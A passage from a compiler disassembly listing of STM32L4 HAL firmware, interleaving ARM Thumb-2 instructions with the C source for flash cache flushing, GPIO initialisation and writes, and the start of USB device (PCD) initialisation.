 800180e:	f423 6300 	bic.w	r3, r3, #2048	; 0x800
 8001812:	6013      	str	r3, [r2, #0]
    /* Enable instruction cache */
    __HAL_FLASH_INSTRUCTION_CACHE_ENABLE();
 8001814:	4b14      	ldr	r3, [pc, #80]	; (8001868 <FLASH_FlushCaches+0x90>)
 8001816:	681b      	ldr	r3, [r3, #0]
 8001818:	4a13      	ldr	r2, [pc, #76]	; (8001868 <FLASH_FlushCaches+0x90>)
 800181a:	f443 7300 	orr.w	r3, r3, #512	; 0x200
 800181e:	6013      	str	r3, [r2, #0]
  }

  /* Flush data cache */
  if((cache == FLASH_CACHE_DCACHE_ENABLED) ||
 8001820:	79fb      	ldrb	r3, [r7, #7]
 8001822:	2b02      	cmp	r3, #2
 8001824:	d002      	beq.n	800182c <FLASH_FlushCaches+0x54>
 8001826:	79fb      	ldrb	r3, [r7, #7]
 8001828:	2b03      	cmp	r3, #3
 800182a:	d111      	bne.n	8001850 <FLASH_FlushCaches+0x78>
     (cache == FLASH_CACHE_ICACHE_DCACHE_ENABLED))
  {
    /* Reset data cache */
    __HAL_FLASH_DATA_CACHE_RESET();
 800182c:	4b0e      	ldr	r3, [pc, #56]	; (8001868 <FLASH_FlushCaches+0x90>)
 800182e:	681b      	ldr	r3, [r3, #0]
 8001830:	4a0d      	ldr	r2, [pc, #52]	; (8001868 <FLASH_FlushCaches+0x90>)
 8001832:	f443 5380 	orr.w	r3, r3, #4096	; 0x1000
 8001836:	6013      	str	r3, [r2, #0]
 8001838:	4b0b      	ldr	r3, [pc, #44]	; (8001868 <FLASH_FlushCaches+0x90>)
 800183a:	681b      	ldr	r3, [r3, #0]
 800183c:	4a0a      	ldr	r2, [pc, #40]	; (8001868 <FLASH_FlushCaches+0x90>)
 800183e:	f423 5380 	bic.w	r3, r3, #4096	; 0x1000
 8001842:	6013      	str	r3, [r2, #0]
    /* Enable data cache */
    __HAL_FLASH_DATA_CACHE_ENABLE();
 8001844:	4b08      	ldr	r3, [pc, #32]	; (8001868 <FLASH_FlushCaches+0x90>)
 8001846:	681b      	ldr	r3, [r3, #0]
 8001848:	4a07      	ldr	r2, [pc, #28]	; (8001868 <FLASH_FlushCaches+0x90>)
 800184a:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 800184e:	6013      	str	r3, [r2, #0]
  }

  /* Reset internal variable */
  pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;
 8001850:	4b04      	ldr	r3, [pc, #16]	; (8001864 <FLASH_FlushCaches+0x8c>)
 8001852:	2200      	movs	r2, #0
 8001854:	771a      	strb	r2, [r3, #28]
}
 8001856:	bf00      	nop
 8001858:	370c      	adds	r7, #12
 800185a:	46bd      	mov	sp, r7
 800185c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001860:	4770      	bx	lr
 8001862:	bf00      	nop
 8001864:	2000000c 	.word	0x2000000c
 8001868:	40022000 	.word	0x40022000

0800186c <HAL_GPIO_Init>:
  * @param  GPIO_Init pointer to a GPIO_InitTypeDef structure that contains
  *         the configuration information for the specified GPIO peripheral.
  * @retval None
  */
void HAL_GPIO_Init(GPIO_TypeDef  *GPIOx, GPIO_InitTypeDef *GPIO_Init)
{
 800186c:	b480      	push	{r7}
 800186e:	b087      	sub	sp, #28
 8001870:	af00      	add	r7, sp, #0
 8001872:	6078      	str	r0, [r7, #4]
 8001874:	6039      	str	r1, [r7, #0]
  uint32_t position = 0x00u;
 8001876:	2300      	movs	r3, #0
 8001878:	617b      	str	r3, [r7, #20]
  assert_param(IS_GPIO_ALL_INSTANCE(GPIOx));
  assert_param(IS_GPIO_PIN(GPIO_Init->Pin));
  assert_param(IS_GPIO_MODE(GPIO_Init->Mode));

  /* Configure the port pins */
  while (((GPIO_Init->Pin) >> position) != 0x00u)
 800187a:	e148      	b.n	8001b0e <HAL_GPIO_Init+0x2a2>
  {
    /* Get current io position */
    iocurrent = (GPIO_Init->Pin) & (1uL << position);
 800187c:	683b      	ldr	r3, [r7, #0]
 800187e:	681a      	ldr	r2, [r3, #0]
 8001880:	2101      	movs	r1, #1
 8001882:	697b      	ldr	r3, [r7, #20]
 8001884:	fa01 f303 	lsl.w	r3, r1, r3
 8001888:	4013      	ands	r3, r2
 800188a:	60fb      	str	r3, [r7, #12]

    if (iocurrent != 0x00u)
 800188c:	68fb      	ldr	r3, [r7, #12]
 800188e:	2b00      	cmp	r3, #0
 8001890:	f000 813a 	beq.w	8001b08 <HAL_GPIO_Init+0x29c>
    {
      /*--------------------- GPIO Mode Configuration ------------------------*/
      /* In case of Output or Alternate function mode selection */
      if (((GPIO_Init->Mode & GPIO_MODE) == MODE_OUTPUT) || ((GPIO_Init->Mode & GPIO_MODE) == MODE_AF))
 8001894:	683b      	ldr	r3, [r7, #0]
 8001896:	685b      	ldr	r3, [r3, #4]
 8001898:	f003 0303 	and.w	r3, r3, #3
 800189c:	2b01      	cmp	r3, #1
 800189e:	d005      	beq.n	80018ac <HAL_GPIO_Init+0x40>
 80018a0:	683b      	ldr	r3, [r7, #0]
 80018a2:	685b      	ldr	r3, [r3, #4]
 80018a4:	f003 0303 	and.w	r3, r3, #3
 80018a8:	2b02      	cmp	r3, #2
 80018aa:	d130      	bne.n	800190e <HAL_GPIO_Init+0xa2>
      {
        /* Check the Speed parameter */
        assert_param(IS_GPIO_SPEED(GPIO_Init->Speed));

        /* Configure the IO Speed */
        temp = GPIOx->OSPEEDR;
 80018ac:	687b      	ldr	r3, [r7, #4]
 80018ae:	689b      	ldr	r3, [r3, #8]
 80018b0:	613b      	str	r3, [r7, #16]
        temp &= ~(GPIO_OSPEEDR_OSPEED0 << (position * 2u));
 80018b2:	697b      	ldr	r3, [r7, #20]
 80018b4:	005b      	lsls	r3, r3, #1
 80018b6:	2203      	movs	r2, #3
 80018b8:	fa02 f303 	lsl.w	r3, r2, r3
 80018bc:	43db      	mvns	r3, r3
 80018be:	693a      	ldr	r2, [r7, #16]
 80018c0:	4013      	ands	r3, r2
 80018c2:	613b      	str	r3, [r7, #16]
        temp |= (GPIO_Init->Speed << (position * 2u));
 80018c4:	683b      	ldr	r3, [r7, #0]
 80018c6:	68da      	ldr	r2, [r3, #12]
 80018c8:	697b      	ldr	r3, [r7, #20]
 80018ca:	005b      	lsls	r3, r3, #1
 80018cc:	fa02 f303 	lsl.w	r3, r2, r3
 80018d0:	693a      	ldr	r2, [r7, #16]
 80018d2:	4313      	orrs	r3, r2
 80018d4:	613b      	str	r3, [r7, #16]
        GPIOx->OSPEEDR = temp;
 80018d6:	687b      	ldr	r3, [r7, #4]
 80018d8:	693a      	ldr	r2, [r7, #16]
 80018da:	609a      	str	r2, [r3, #8]

        /* Configure the IO Output Type */
        temp = GPIOx->OTYPER;
 80018dc:	687b      	ldr	r3, [r7, #4]
 80018de:	685b      	ldr	r3, [r3, #4]
 80018e0:	613b      	str	r3, [r7, #16]
        temp &= ~(GPIO_OTYPER_OT0 << position) ;
 80018e2:	2201      	movs	r2, #1
 80018e4:	697b      	ldr	r3, [r7, #20]
 80018e6:	fa02 f303 	lsl.w	r3, r2, r3
 80018ea:	43db      	mvns	r3, r3
 80018ec:	693a      	ldr	r2, [r7, #16]
 80018ee:	4013      	ands	r3, r2
 80018f0:	613b      	str	r3, [r7, #16]
        temp |= (((GPIO_Init->Mode & OUTPUT_TYPE) >> OUTPUT_TYPE_Pos) << position);
 80018f2:	683b      	ldr	r3, [r7, #0]
 80018f4:	685b      	ldr	r3, [r3, #4]
 80018f6:	091b      	lsrs	r3, r3, #4
 80018f8:	f003 0201 	and.w	r2, r3, #1
 80018fc:	697b      	ldr	r3, [r7, #20]
 80018fe:	fa02 f303 	lsl.w	r3, r2, r3
 8001902:	693a      	ldr	r2, [r7, #16]
 8001904:	4313      	orrs	r3, r2
 8001906:	613b      	str	r3, [r7, #16]
        GPIOx->OTYPER = temp;
 8001908:	687b      	ldr	r3, [r7, #4]
 800190a:	693a      	ldr	r2, [r7, #16]
 800190c:	605a      	str	r2, [r3, #4]
      }

#endif /* STM32L471xx || STM32L475xx || STM32L476xx || STM32L485xx || STM32L486xx */

      /* Activate the Pull-up or Pull down resistor for the current IO */
      if ((GPIO_Init->Mode & GPIO_MODE) != MODE_ANALOG)
 800190e:	683b      	ldr	r3, [r7, #0]
 8001910:	685b      	ldr	r3, [r3, #4]
 8001912:	f003 0303 	and.w	r3, r3, #3
 8001916:	2b03      	cmp	r3, #3
 8001918:	d017      	beq.n	800194a <HAL_GPIO_Init+0xde>
      {
        /* Check the Pull parameter */
        assert_param(IS_GPIO_PULL(GPIO_Init->Pull));

        temp = GPIOx->PUPDR;
 800191a:	687b      	ldr	r3, [r7, #4]
 800191c:	68db      	ldr	r3, [r3, #12]
 800191e:	613b      	str	r3, [r7, #16]
        temp &= ~(GPIO_PUPDR_PUPD0 << (position * 2U));
 8001920:	697b      	ldr	r3, [r7, #20]
 8001922:	005b      	lsls	r3, r3, #1
 8001924:	2203      	movs	r2, #3
 8001926:	fa02 f303 	lsl.w	r3, r2, r3
 800192a:	43db      	mvns	r3, r3
 800192c:	693a      	ldr	r2, [r7, #16]
 800192e:	4013      	ands	r3, r2
 8001930:	613b      	str	r3, [r7, #16]
        temp |= ((GPIO_Init->Pull) << (position * 2U));
 8001932:	683b      	ldr	r3, [r7, #0]
 8001934:	689a      	ldr	r2, [r3, #8]
 8001936:	697b      	ldr	r3, [r7, #20]
 8001938:	005b      	lsls	r3, r3, #1
 800193a:	fa02 f303 	lsl.w	r3, r2, r3
 800193e:	693a      	ldr	r2, [r7, #16]
 8001940:	4313      	orrs	r3, r2
 8001942:	613b      	str	r3, [r7, #16]
        GPIOx->PUPDR = temp;
 8001944:	687b      	ldr	r3, [r7, #4]
 8001946:	693a      	ldr	r2, [r7, #16]
 8001948:	60da      	str	r2, [r3, #12]
      }

      /* In case of Alternate function mode selection */
      if ((GPIO_Init->Mode & GPIO_MODE) == MODE_AF)
 800194a:	683b      	ldr	r3, [r7, #0]
 800194c:	685b      	ldr	r3, [r3, #4]
 800194e:	f003 0303 	and.w	r3, r3, #3
 8001952:	2b02      	cmp	r3, #2
 8001954:	d123      	bne.n	800199e <HAL_GPIO_Init+0x132>
        /* Check the Alternate function parameters */
        assert_param(IS_GPIO_AF_INSTANCE(GPIOx));
        assert_param(IS_GPIO_AF(GPIO_Init->Alternate));

        /* Configure Alternate function mapped with the current IO */
        temp = GPIOx->AFR[position >> 3u];
 8001956:	697b      	ldr	r3, [r7, #20]
 8001958:	08da      	lsrs	r2, r3, #3
 800195a:	687b      	ldr	r3, [r7, #4]
 800195c:	3208      	adds	r2, #8
 800195e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8001962:	613b      	str	r3, [r7, #16]
        temp &= ~(0xFu << ((position & 0x07u) * 4u));
 8001964:	697b      	ldr	r3, [r7, #20]
 8001966:	f003 0307 	and.w	r3, r3, #7
 800196a:	009b      	lsls	r3, r3, #2
 800196c:	220f      	movs	r2, #15
 800196e:	fa02 f303 	lsl.w	r3, r2, r3
 8001972:	43db      	mvns	r3, r3
 8001974:	693a      	ldr	r2, [r7, #16]
 8001976:	4013      	ands	r3, r2
 8001978:	613b      	str	r3, [r7, #16]
        temp |= ((GPIO_Init->Alternate) << ((position & 0x07u) * 4u));
 800197a:	683b      	ldr	r3, [r7, #0]
 800197c:	691a      	ldr	r2, [r3, #16]
 800197e:	697b      	ldr	r3, [r7, #20]
 8001980:	f003 0307 	and.w	r3, r3, #7
 8001984:	009b      	lsls	r3, r3, #2
 8001986:	fa02 f303 	lsl.w	r3, r2, r3
 800198a:	693a      	ldr	r2, [r7, #16]
 800198c:	4313      	orrs	r3, r2
 800198e:	613b      	str	r3, [r7, #16]
        GPIOx->AFR[position >> 3u] = temp;
 8001990:	697b      	ldr	r3, [r7, #20]
 8001992:	08da      	lsrs	r2, r3, #3
 8001994:	687b      	ldr	r3, [r7, #4]
 8001996:	3208      	adds	r2, #8
 8001998:	6939      	ldr	r1, [r7, #16]
 800199a:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
      }

      /* Configure IO Direction mode (Input, Output, Alternate or Analog) */
      temp = GPIOx->MODER;
 800199e:	687b      	ldr	r3, [r7, #4]
 80019a0:	681b      	ldr	r3, [r3, #0]
 80019a2:	613b      	str	r3, [r7, #16]
      temp &= ~(GPIO_MODER_MODE0 << (position * 2u));
 80019a4:	697b      	ldr	r3, [r7, #20]
 80019a6:	005b      	lsls	r3, r3, #1
 80019a8:	2203      	movs	r2, #3
 80019aa:	fa02 f303 	lsl.w	r3, r2, r3
 80019ae:	43db      	mvns	r3, r3
 80019b0:	693a      	ldr	r2, [r7, #16]
 80019b2:	4013      	ands	r3, r2
 80019b4:	613b      	str	r3, [r7, #16]
      temp |= ((GPIO_Init->Mode & GPIO_MODE) << (position * 2u));
 80019b6:	683b      	ldr	r3, [r7, #0]
 80019b8:	685b      	ldr	r3, [r3, #4]
 80019ba:	f003 0203 	and.w	r2, r3, #3
 80019be:	697b      	ldr	r3, [r7, #20]
 80019c0:	005b      	lsls	r3, r3, #1
 80019c2:	fa02 f303 	lsl.w	r3, r2, r3
 80019c6:	693a      	ldr	r2, [r7, #16]
 80019c8:	4313      	orrs	r3, r2
 80019ca:	613b      	str	r3, [r7, #16]
      GPIOx->MODER = temp;
 80019cc:	687b      	ldr	r3, [r7, #4]
 80019ce:	693a      	ldr	r2, [r7, #16]
 80019d0:	601a      	str	r2, [r3, #0]

      /*--------------------- EXTI Mode Configuration ------------------------*/
      /* Configure the External Interrupt or event for the current IO */
      if ((GPIO_Init->Mode & EXTI_MODE) != 0x00u)
 80019d2:	683b      	ldr	r3, [r7, #0]
 80019d4:	685b      	ldr	r3, [r3, #4]
 80019d6:	f403 3340 	and.w	r3, r3, #196608	; 0x30000
 80019da:	2b00      	cmp	r3, #0
 80019dc:	f000 8094 	beq.w	8001b08 <HAL_GPIO_Init+0x29c>
      {
        /* Enable SYSCFG Clock */
        __HAL_RCC_SYSCFG_CLK_ENABLE();
 80019e0:	4b52      	ldr	r3, [pc, #328]	; (8001b2c <HAL_GPIO_Init+0x2c0>)
 80019e2:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 80019e4:	4a51      	ldr	r2, [pc, #324]	; (8001b2c <HAL_GPIO_Init+0x2c0>)
 80019e6:	f043 0301 	orr.w	r3, r3, #1
 80019ea:	6613      	str	r3, [r2, #96]	; 0x60
 80019ec:	4b4f      	ldr	r3, [pc, #316]	; (8001b2c <HAL_GPIO_Init+0x2c0>)
 80019ee:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 80019f0:	f003 0301 	and.w	r3, r3, #1
 80019f4:	60bb      	str	r3, [r7, #8]
 80019f6:	68bb      	ldr	r3, [r7, #8]

        temp = SYSCFG->EXTICR[position >> 2u];
 80019f8:	4a4d      	ldr	r2, [pc, #308]	; (8001b30 <HAL_GPIO_Init+0x2c4>)
 80019fa:	697b      	ldr	r3, [r7, #20]
 80019fc:	089b      	lsrs	r3, r3, #2
 80019fe:	3302      	adds	r3, #2
 8001a00:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 8001a04:	613b      	str	r3, [r7, #16]
        temp &= ~(0x0FuL << (4u * (position & 0x03u)));
 8001a06:	697b      	ldr	r3, [r7, #20]
 8001a08:	f003 0303 	and.w	r3, r3, #3
 8001a0c:	009b      	lsls	r3, r3, #2
 8001a0e:	220f      	movs	r2, #15
 8001a10:	fa02 f303 	lsl.w	r3, r2, r3
 8001a14:	43db      	mvns	r3, r3
 8001a16:	693a      	ldr	r2, [r7, #16]
 8001a18:	4013      	ands	r3, r2
 8001a1a:	613b      	str	r3, [r7, #16]
        temp |= (GPIO_GET_INDEX(GPIOx) << (4u * (position & 0x03u)));
 8001a1c:	687b      	ldr	r3, [r7, #4]
 8001a1e:	f1b3 4f90 	cmp.w	r3, #1207959552	; 0x48000000
 8001a22:	d00d      	beq.n	8001a40 <HAL_GPIO_Init+0x1d4>
 8001a24:	687b      	ldr	r3, [r7, #4]
 8001a26:	4a43      	ldr	r2, [pc, #268]	; (8001b34 <HAL_GPIO_Init+0x2c8>)
 8001a28:	4293      	cmp	r3, r2
 8001a2a:	d007      	beq.n	8001a3c <HAL_GPIO_Init+0x1d0>
 8001a2c:	687b      	ldr	r3, [r7, #4]
 8001a2e:	4a42      	ldr	r2, [pc, #264]	; (8001b38 <HAL_GPIO_Init+0x2cc>)
 8001a30:	4293      	cmp	r3, r2
 8001a32:	d101      	bne.n	8001a38 <HAL_GPIO_Init+0x1cc>
 8001a34:	2302      	movs	r3, #2
 8001a36:	e004      	b.n	8001a42 <HAL_GPIO_Init+0x1d6>
 8001a38:	2307      	movs	r3, #7
 8001a3a:	e002      	b.n	8001a42 <HAL_GPIO_Init+0x1d6>
 8001a3c:	2301      	movs	r3, #1
 8001a3e:	e000      	b.n	8001a42 <HAL_GPIO_Init+0x1d6>
 8001a40:	2300      	movs	r3, #0
 8001a42:	697a      	ldr	r2, [r7, #20]
 8001a44:	f002 0203 	and.w	r2, r2, #3
 8001a48:	0092      	lsls	r2, r2, #2
 8001a4a:	4093      	lsls	r3, r2
 8001a4c:	693a      	ldr	r2, [r7, #16]
 8001a4e:	4313      	orrs	r3, r2
 8001a50:	613b      	str	r3, [r7, #16]
        SYSCFG->EXTICR[position >> 2u] = temp;
 8001a52:	4937      	ldr	r1, [pc, #220]	; (8001b30 <HAL_GPIO_Init+0x2c4>)
 8001a54:	697b      	ldr	r3, [r7, #20]
 8001a56:	089b      	lsrs	r3, r3, #2
 8001a58:	3302      	adds	r3, #2
 8001a5a:	693a      	ldr	r2, [r7, #16]
 8001a5c:	f841 2023 	str.w	r2, [r1, r3, lsl #2]

        /* Clear Rising Falling edge configuration */
        temp = EXTI->RTSR1;
 8001a60:	4b36      	ldr	r3, [pc, #216]	; (8001b3c <HAL_GPIO_Init+0x2d0>)
 8001a62:	689b      	ldr	r3, [r3, #8]
 8001a64:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001a66:	68fb      	ldr	r3, [r7, #12]
 8001a68:	43db      	mvns	r3, r3
 8001a6a:	693a      	ldr	r2, [r7, #16]
 8001a6c:	4013      	ands	r3, r2
 8001a6e:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & TRIGGER_RISING) != 0x00u)
 8001a70:	683b      	ldr	r3, [r7, #0]
 8001a72:	685b      	ldr	r3, [r3, #4]
 8001a74:	f403 1380 	and.w	r3, r3, #1048576	; 0x100000
 8001a78:	2b00      	cmp	r3, #0
 8001a7a:	d003      	beq.n	8001a84 <HAL_GPIO_Init+0x218>
        {
          temp |= iocurrent;
 8001a7c:	693a      	ldr	r2, [r7, #16]
 8001a7e:	68fb      	ldr	r3, [r7, #12]
 8001a80:	4313      	orrs	r3, r2
 8001a82:	613b      	str	r3, [r7, #16]
        }
        EXTI->RTSR1 = temp;
 8001a84:	4a2d      	ldr	r2, [pc, #180]	; (8001b3c <HAL_GPIO_Init+0x2d0>)
 8001a86:	693b      	ldr	r3, [r7, #16]
 8001a88:	6093      	str	r3, [r2, #8]

        temp = EXTI->FTSR1;
 8001a8a:	4b2c      	ldr	r3, [pc, #176]	; (8001b3c <HAL_GPIO_Init+0x2d0>)
 8001a8c:	68db      	ldr	r3, [r3, #12]
 8001a8e:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001a90:	68fb      	ldr	r3, [r7, #12]
 8001a92:	43db      	mvns	r3, r3
 8001a94:	693a      	ldr	r2, [r7, #16]
 8001a96:	4013      	ands	r3, r2
 8001a98:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & TRIGGER_FALLING) != 0x00u)
 8001a9a:	683b      	ldr	r3, [r7, #0]
 8001a9c:	685b      	ldr	r3, [r3, #4]
 8001a9e:	f403 1300 	and.w	r3, r3, #2097152	; 0x200000
 8001aa2:	2b00      	cmp	r3, #0
 8001aa4:	d003      	beq.n	8001aae <HAL_GPIO_Init+0x242>
        {
          temp |= iocurrent;
 8001aa6:	693a      	ldr	r2, [r7, #16]
 8001aa8:	68fb      	ldr	r3, [r7, #12]
 8001aaa:	4313      	orrs	r3, r2
 8001aac:	613b      	str	r3, [r7, #16]
        }
        EXTI->FTSR1 = temp;
 8001aae:	4a23      	ldr	r2, [pc, #140]	; (8001b3c <HAL_GPIO_Init+0x2d0>)
 8001ab0:	693b      	ldr	r3, [r7, #16]
 8001ab2:	60d3      	str	r3, [r2, #12]

        /* Clear EXTI line configuration */
        temp = EXTI->EMR1;
 8001ab4:	4b21      	ldr	r3, [pc, #132]	; (8001b3c <HAL_GPIO_Init+0x2d0>)
 8001ab6:	685b      	ldr	r3, [r3, #4]
 8001ab8:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001aba:	68fb      	ldr	r3, [r7, #12]
 8001abc:	43db      	mvns	r3, r3
 8001abe:	693a      	ldr	r2, [r7, #16]
 8001ac0:	4013      	ands	r3, r2
 8001ac2:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & EXTI_EVT) != 0x00u)
 8001ac4:	683b      	ldr	r3, [r7, #0]
 8001ac6:	685b      	ldr	r3, [r3, #4]
 8001ac8:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8001acc:	2b00      	cmp	r3, #0
 8001ace:	d003      	beq.n	8001ad8 <HAL_GPIO_Init+0x26c>
        {
          temp |= iocurrent;
 8001ad0:	693a      	ldr	r2, [r7, #16]
 8001ad2:	68fb      	ldr	r3, [r7, #12]
 8001ad4:	4313      	orrs	r3, r2
 8001ad6:	613b      	str	r3, [r7, #16]
        }
        EXTI->EMR1 = temp;
 8001ad8:	4a18      	ldr	r2, [pc, #96]	; (8001b3c <HAL_GPIO_Init+0x2d0>)
 8001ada:	693b      	ldr	r3, [r7, #16]
 8001adc:	6053      	str	r3, [r2, #4]

        temp = EXTI->IMR1;
 8001ade:	4b17      	ldr	r3, [pc, #92]	; (8001b3c <HAL_GPIO_Init+0x2d0>)
 8001ae0:	681b      	ldr	r3, [r3, #0]
 8001ae2:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001ae4:	68fb      	ldr	r3, [r7, #12]
 8001ae6:	43db      	mvns	r3, r3
 8001ae8:	693a      	ldr	r2, [r7, #16]
 8001aea:	4013      	ands	r3, r2
 8001aec:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & EXTI_IT) != 0x00u)
 8001aee:	683b      	ldr	r3, [r7, #0]
 8001af0:	685b      	ldr	r3, [r3, #4]
 8001af2:	f403 3380 	and.w	r3, r3, #65536	; 0x10000
 8001af6:	2b00      	cmp	r3, #0
 8001af8:	d003      	beq.n	8001b02 <HAL_GPIO_Init+0x296>
        {
          temp |= iocurrent;
 8001afa:	693a      	ldr	r2, [r7, #16]
 8001afc:	68fb      	ldr	r3, [r7, #12]
 8001afe:	4313      	orrs	r3, r2
 8001b00:	613b      	str	r3, [r7, #16]
        }
        EXTI->IMR1 = temp;
 8001b02:	4a0e      	ldr	r2, [pc, #56]	; (8001b3c <HAL_GPIO_Init+0x2d0>)
 8001b04:	693b      	ldr	r3, [r7, #16]
 8001b06:	6013      	str	r3, [r2, #0]
      }
    }

    position++;
 8001b08:	697b      	ldr	r3, [r7, #20]
 8001b0a:	3301      	adds	r3, #1
 8001b0c:	617b      	str	r3, [r7, #20]
  while (((GPIO_Init->Pin) >> position) != 0x00u)
 8001b0e:	683b      	ldr	r3, [r7, #0]
 8001b10:	681a      	ldr	r2, [r3, #0]
 8001b12:	697b      	ldr	r3, [r7, #20]
 8001b14:	fa22 f303 	lsr.w	r3, r2, r3
 8001b18:	2b00      	cmp	r3, #0
 8001b1a:	f47f aeaf 	bne.w	800187c <HAL_GPIO_Init+0x10>
  }
}
 8001b1e:	bf00      	nop
 8001b20:	bf00      	nop
 8001b22:	371c      	adds	r7, #28
 8001b24:	46bd      	mov	sp, r7
 8001b26:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001b2a:	4770      	bx	lr
 8001b2c:	40021000 	.word	0x40021000
 8001b30:	40010000 	.word	0x40010000
 8001b34:	48000400 	.word	0x48000400
 8001b38:	48000800 	.word	0x48000800
 8001b3c:	40010400 	.word	0x40010400

08001b40 <HAL_GPIO_WritePin>:
  *            @arg GPIO_PIN_RESET: to clear the port pin
  *            @arg GPIO_PIN_SET: to set the port pin
  * @retval None
  */
void HAL_GPIO_WritePin(GPIO_TypeDef* GPIOx, uint16_t GPIO_Pin, GPIO_PinState PinState)
{
 8001b40:	b480      	push	{r7}
 8001b42:	b083      	sub	sp, #12
 8001b44:	af00      	add	r7, sp, #0
 8001b46:	6078      	str	r0, [r7, #4]
 8001b48:	460b      	mov	r3, r1
 8001b4a:	807b      	strh	r3, [r7, #2]
 8001b4c:	4613      	mov	r3, r2
 8001b4e:	707b      	strb	r3, [r7, #1]
  /* Check the parameters */
  assert_param(IS_GPIO_PIN(GPIO_Pin));
  assert_param(IS_GPIO_PIN_ACTION(PinState));

  if(PinState != GPIO_PIN_RESET)
 8001b50:	787b      	ldrb	r3, [r7, #1]
 8001b52:	2b00      	cmp	r3, #0
 8001b54:	d003      	beq.n	8001b5e <HAL_GPIO_WritePin+0x1e>
  {
    GPIOx->BSRR = (uint32_t)GPIO_Pin;
 8001b56:	887a      	ldrh	r2, [r7, #2]
 8001b58:	687b      	ldr	r3, [r7, #4]
 8001b5a:	619a      	str	r2, [r3, #24]
  }
  else
  {
    GPIOx->BRR = (uint32_t)GPIO_Pin;
  }
}
 8001b5c:	e002      	b.n	8001b64 <HAL_GPIO_WritePin+0x24>
    GPIOx->BRR = (uint32_t)GPIO_Pin;
 8001b5e:	887a      	ldrh	r2, [r7, #2]
 8001b60:	687b      	ldr	r3, [r7, #4]
 8001b62:	629a      	str	r2, [r3, #40]	; 0x28
}
 8001b64:	bf00      	nop
 8001b66:	370c      	adds	r7, #12
 8001b68:	46bd      	mov	sp, r7
 8001b6a:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001b6e:	4770      	bx	lr

08001b70 <HAL_PCD_Init>:
  *         parameters in the PCD_InitTypeDef and initialize the associated handle.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_Init(PCD_HandleTypeDef *hpcd)
{
 8001b70:	b5f0      	push	{r4, r5, r6, r7, lr}
 8001b72:	b08b      	sub	sp, #44	; 0x2c
 8001b74:	af06      	add	r7, sp, #24
 8001b76:	6078      	str	r0, [r7, #4]
  USB_OTG_GlobalTypeDef *USBx;
#endif /* defined (USB_OTG_FS) */
  uint8_t i;

  /* Check the PCD handle allocation */
  if (hpcd == NULL)
 8001b78:	687b      	ldr	r3, [r7, #4]
 8001b7a:	2b00      	cmp	r3, #0
 8001b7c:	d101      	bne.n	8001b82 <HAL_PCD_Init+0x12>
  {
    return HAL_ERROR;
 8001b7e:	2301      	movs	r3, #1
 8001b80:	e0f8      	b.n	8001d74 <HAL_PCD_Init+0x204>

#if defined (USB_OTG_FS)
  USBx = hpcd->Instance;
#endif /* defined (USB_OTG_FS) */

  if (hpcd->State == HAL_PCD_STATE_RESET)
 8001b82:	687b      	ldr	r3, [r7, #4]
 8001b84:	f893 32a9 	ldrb.w	r3, [r3, #681]	; 0x2a9
 8001b88:	b2db      	uxtb	r3, r3
 8001b8a:	2b00      	cmp	r3, #0
 8001b8c:	d106      	bne.n	8001b9c <HAL_PCD_Init+0x2c>
  {
    /* Allocate lock resource and initialize it */
    hpcd->Lock = HAL_UNLOCKED;
 8001b8e:	687b      	ldr	r3, [r7, #4]
 8001b90:	2200      	movs	r2, #0
 8001b92:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

    /* Init the low level hardware */
    hpcd->MspInitCallback(hpcd);
#else
    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
    HAL_PCD_MspInit(hpcd);
 8001b96:	6878      	ldr	r0, [r7, #4]
 8001b98:	f00a fde4 	bl	800c764 <HAL_PCD_MspInit>
#endif /* (USE_HAL_PCD_REGISTER_CALLBACKS) */
  }

  hpcd->State = HAL_PCD_STATE_BUSY;
 8001b9c:	687b      	ldr	r3, [r7, #4]
 8001b9e:	2203      	movs	r2, #3
 8001ba0:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9
    hpcd->Init.dma_enable = 0U;
  }
#endif /* defined (USB_OTG_FS) */

  /* Disable the Interrupts */
  __HAL_PCD_DISABLE(hpcd);
 8001ba4:	687b      	ldr	r3, [r7, #4]
 8001ba6:	681b      	ldr	r3, [r3, #0]
 8001ba8:	4618      	mov	r0, r3
 8001baa:	f004 f8d4 	bl	8005d56 <USB_DisableGlobalInt>

  /*Init the Core (common init.) */
  if (USB_CoreInit(hpcd->Instance, hpcd->Init) != HAL_OK)
 8001bae:	687b      	ldr	r3, [r7, #4]
 8001bb0:	681b      	ldr	r3, [r3, #0]
 8001bb2:	603b      	str	r3, [r7, #0]
 8001bb4:	687e      	ldr	r6, [r7, #4]
 8001bb6:	466d      	mov	r5, sp
 8001bb8:	f106 0410 	add.w	r4, r6, #16
 8001bbc:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8001bbe:	c50f      	stmia	r5!, {r0, r1, r2, r3}
 8001bc0:	6823      	ldr	r3, [r4, #0]
 8001bc2:	602b      	str	r3, [r5, #0]
 8001bc4:	1d33      	adds	r3, r6, #4
 8001bc6:	cb0e      	ldmia	r3, {r1, r2, r3}
 8001bc8:	6838      	ldr	r0, [r7, #0]
 8001bca:	f004 f89c 	bl	8005d06 <USB_CoreInit>
 8001bce:	4603      	mov	r3, r0
 8001bd0:	2b00      	cmp	r3, #0
 8001bd2:	d005      	beq.n	8001be0 <HAL_PCD_Init+0x70>
  {
